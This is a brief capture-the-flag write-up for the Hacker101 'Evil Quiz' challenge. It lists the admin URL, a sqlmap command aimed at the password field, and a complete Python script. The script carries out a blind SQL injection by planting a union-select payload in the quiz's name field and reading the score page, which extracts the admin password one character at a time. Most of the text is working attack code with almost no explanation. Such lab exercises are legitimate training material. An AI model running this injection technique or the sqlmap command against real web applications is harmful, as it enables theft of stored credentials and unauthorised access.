Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!

**admin**

the admin page is at:
`https://f9a13d7dbbdf5fa6d8410d6f9f9d9e10.ctf.hacker101.com/evil-quiz/admin/`

**sqlmap**

`sqlmap -r posts.txt --level=5 risk=3 --force-ssl -p password`

**exploit script**

using this script to exploit
```
#!/usr/bin/env python3
import requests

url='https://fdae5203bfb8670861592d2c80c9557c.ctf.hacker101.com/evil-quiz/'
cookies={'quizsession':'130bb8e4e20b6f534b1196c1c64d0252'}
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'

def attack(password):
    index=len(password)+1
    for letter in alphabet:
        print(letter)
        data={'name': "testabcd' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
        r = requests.post(url, cookies=cookies, data=data)
        data={'ques_1':0,'ques_2':0,'ques_3':0}
        r = requests.post(url+'start/', cookies=cookies, data=data)
        r = requests.get(url + 'score/', cookies=cookies)
        if 'There is 1 other' in r.text:
            print("found: "+password + letter)
            return password + letter
    return password

#password='S3creT'
password=''
while True:
    np=attack(password)
    if np == password:
        print("Password found: '%s'" % (password))
        break
    password=np

```
